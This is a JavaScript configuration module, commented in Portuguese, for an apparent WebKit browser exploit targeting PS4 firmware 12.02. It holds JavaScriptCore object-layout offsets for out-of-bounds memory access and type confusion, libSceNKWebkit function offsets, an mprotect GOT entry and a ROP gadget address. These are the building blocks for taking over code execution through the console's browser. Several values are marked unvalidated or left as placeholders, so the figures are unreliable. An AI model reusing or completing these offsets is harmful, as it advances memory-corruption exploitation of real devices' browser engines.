// js/config.mjs

// Firmware: PS4 12.02
// OFFSETS VALIDADOS/REFINADOS COM BASE NA ANÁLISE DE DISASSEMBLY (ArrayBuffer.txt, JSON.txt, m_type...)
export const JSC_OFFSETS = {
    JSCell: {
        // Estes são os offsets DENTRO de uma JSCell, que é o cabeçalho base para todos os objetos JS.
        // O StructureID identifica o tipo e o layout do objeto.
        // Se o StructureID está diretamente na célula:
        STRUCTURE_ID_OFFSET: 0x00,       // Offset do StructureID (uint32_t) dentro da JSCell. (VALIDADO)
        FLAGS_OFFSET: 0x04,            // Offset das Flags (uint32_t) dentro da JSCell. (VALIDADO)
        // Se, em vez disso, a JSCell contém um ponteiro para uma estrutura Structure separada:
        STRUCTURE_POINTER_OFFSET: 0x8,   // Offset do ponteiro para a Structure (Structure*) dentro da JSCell. (ASSUMIDO E CRUCIAL PARA VALIDAR)
    },

    Structure: {
        // Offsets DENTRO do objeto JSC::Structure (se STRUCTURE_POINTER_OFFSET for usado).
        // Estes precisam de validação profunda com seus binários. O construtor em m_type e m_structureID.txt ajuda.
        // Exemplo (VALIDAR ESTES OFFSETS):
        // TYPE_INFO_TYPE_OFFSET: 0x0A, // Onde o tipo numérico (JSType) pode estar dentro da TypeInfo da Structure
        // CLASS_INFO_OFFSET: 0x30,
        // PROTOTYPE_OFFSET: 0x08,
        // Se você puder ler o ponteiro da Structure de um objeto, então ler [Structure_ptr + TYPE_INFO_TYPE_OFFSET] lhe daria o StructureID.
    },

    JSObject: {
        // Se JSCell tem 8 bytes (ID + Flags) ou 16 bytes (com vtable e/ou Structure*), o Butterfly (para propriedades/elementos) viria depois.
        BUTTERFLY_OFFSET: 0x08, // CANDIDATO, se StructureID está direto e não há vtable. Se Structure* está em 0x8, Butterfly pode ser 0x10. VALIDAR!
    },

    ArrayBuffer: {
        // Offsets relativos ao início do objeto JSArrayBuffer (que começa com uma JSCell).
        CONTENTS_IMPL_POINTER_OFFSET: 0x10, // Ponteiro para ArrayBufferContents*
        SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START: 0x30, // byteLength, relativo ao JSArrayBuffer*
        DATA_POINTER_OFFSET_FROM_JSARRAYBUFFER_START: 0x20,  // dataPointer, relativo ao JSArrayBuffer*
    },

    ArrayBufferView: { // Como DataView, Uint8Array, etc.
        STRUCTURE_ID_OFFSET: 0x00,
        FLAGS_OFFSET: 0x04,
        ASSOCIATED_ARRAYBUFFER_OFFSET: 0x08,
        M_VECTOR_OFFSET: 0x10, // Ponteiro para os dados
        M_LENGTH_OFFSET: 0x18, // Comprimento da view
        M_MODE_OFFSET: 0x1C
    },

    JSFunction: {
        M_EXECUTABLE_OFFSET: "0x20", // VALIDAR
        M_SCOPE_OFFSET: "0x28",      // VALIDAR
    },

    SymbolObject: {
        PRIVATE_SYMBOL_POINTER_OFFSET: 0x10, // VALIDAR
    }
};

// !! PREENCHA ESTES COM VALORES HEXADECIMAIS REAIS DOS SEUS BINÁRIOS !!
export const KNOWN_STRUCTURE_IDS = {
    TYPE_ARRAY_BUFFER: "0xFILL_ME_IN_ARRAYBUFFER_ID",
    TYPE_UINT8_ARRAY:  "0xFILL_ME_IN_UINT8ARRAY_ID",
    TYPE_DATAVIEW:     "0xFILL_ME_IN_DATAVIEW_ID",
    TYPE_JS_FUNCTION:  "0xFILL_ME_IN_JSFUNCTION_ID",
    TYPE_JS_OBJECT_GENERIC: "0xFILL_ME_IN_JSOBJECT_ID",
    TYPE_JS_STRING:    "0xFILL_ME_IN_JSSTRING_ID",
    TYPE_JS_ARRAY:     "0xFILL_ME_IN_JSARRAY_ID",
    TYPE_FINAL_OBJECT: "0xFILL_ME_IN_FINALOBJECT_ID",
    TYPE_FAKE_TARGET_FOR_CONFUSION: "0xFILL_ME_IN_SOME_OTHER_ID",
};

export const WEBKIT_LIBRARY_INFO = {
    MODULE_NAME: "libSceNKWebkit.sprx",
    KNOWN_OFFSETS: {},
    GOT_ENTRIES: { "mprotect": "0x3CBD820" },
    FUNCTION_OFFSETS: { /* ... (mantenha como estava ou valide/preencha) ... */
        "JSC::JSFunction::create": "0x58A1D0",
        "JSC::Structure::Structure_constructor": "0x1638A50",
        "WTF::fastMalloc": "0x1271810",
        "WTF::fastFree": "0x230C7D0",
        "gadget_lea_rax_rdi_plus_20_ret": "0x58B860",
    }
};

export let OOB_CONFIG = {
    ALLOCATION_SIZE: 32768,
    BASE_OFFSET_IN_DV: 128,
    INITIAL_BUFFER_SIZE: 32
};

export function updateOOBConfigFromUI(docInstance) {
    if (!docInstance || typeof docInstance.getElementById !== 'function') {
        return;
    }
    try {
        const oobAllocSizeEl = docInstance.getElementById('oobAllocSize');
        const baseOffsetEl = docInstance.getElementById('baseOffset');

        if (oobAllocSizeEl && oobAllocSizeEl.value !== undefined) {
            const val = parseInt(oobAllocSizeEl.value, 10);
            if (!isNaN(val) && val > 0) OOB_CONFIG.ALLOCATION_SIZE = val;
        }
        if (baseOffsetEl && baseOffsetEl.value !== undefined) {
            const val = parseInt(baseOffsetEl.value, 10);
            if (!isNaN(val) && val >= 0) OOB_CONFIG.BASE_OFFSET_IN_DV = val;
        }
    } catch (e) {
        console.warn("Erro ao atualizar OOB_CONFIG da UI:", e.message);
    }
}
